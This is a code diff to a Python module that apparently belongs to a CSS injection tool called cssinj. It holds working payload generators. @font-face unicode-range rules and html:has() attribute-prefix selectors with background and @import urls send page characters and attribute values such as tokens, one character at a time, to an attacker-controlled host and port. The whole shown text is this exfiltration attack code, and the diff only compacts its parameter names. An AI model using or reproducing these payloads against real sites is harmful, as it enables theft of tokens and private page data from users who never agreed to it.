@@ -5,8 +5,8 @@ from cssinj.utils import default
 def generate_payload_font_face(hostname, port, attribut, element, client):
     stri = ""
     for char in default.PRINTABLE:
-        stri += f'@font-face {{font-family: poc;src: url("//{hostname}:{port}/valid?client_id={client.id}&token={urllib.parse.quote_plus(char)}");unicode-range: U+{ord(char):04X};}}\n'
-    stri += f"{element}{'.'+attribut if attribut else ''} {{font-family: 'poc';}}"
+        stri += f'@font-face {{font-family:e;src:url("//{hostname}:{port}/valid?cid={client.id}&t={urllib.parse.quote_plus(char)}");unicode-range: U+{ord(char):04X};}}'
+    stri += f"{element}{'.'+attribut if attribut else ''} {{font-family:e;}}"
 
     return stri
 
@@ -24,7 +24,7 @@ def generate_payload_recursive_import(hostname, port, attribut, element, client)
     stri += f"html:has({element}[{attribut}={repr(client.data)}]"
     stri += f"{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})"
     stri += f"{"".join([":first-child" for i in range(client.counter)])}"
-    stri += f'{{background: url("//{hostname}:{port}/end?num={client.counter}&client_id={client.id}") !important;}}'
+    stri += f'{{background: url("//{hostname}:{port}/end?n={client.counter}&cid={client.id}");}}'
 
     # Payload to extract the token
     stri += "".join(
@@ -32,7 +32,7 @@ def generate_payload_recursive_import(hostname, port, attribut, element, client)
             lambda x: f"html:has({element}[{attribut}^={repr(client.data+x)}]"
             f'{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})'
             f'{"".join([":first-child" for i in range(client.counter)])}'
-            f'{{background: url("//{hostname}:{port}/valid?token={urllib.parse.quote_plus(client.data+x)}&client_id={client.id}") !important;}}\n',
+            f'{{background: url("//{hostname}:{port}/valid?t={urllib.parse.quote_plus(client.data+x)}&cid={client.id}");}}',
             default.PRINTABLE,
         )
     )
@@ -41,4 +41,6 @@ def generate_payload_recursive_import(hostname, port, attribut, element, client)
 
 
 def generate_next_import(hostname, port, client):
-    return f"@import url('//{hostname}:{port}/next?num={client.counter}&client_id={client.id}');"
+    return (
+        f"@import url('//{hostname}:{port}/next?n={client.counter}&cid={client.id}');"
+    )
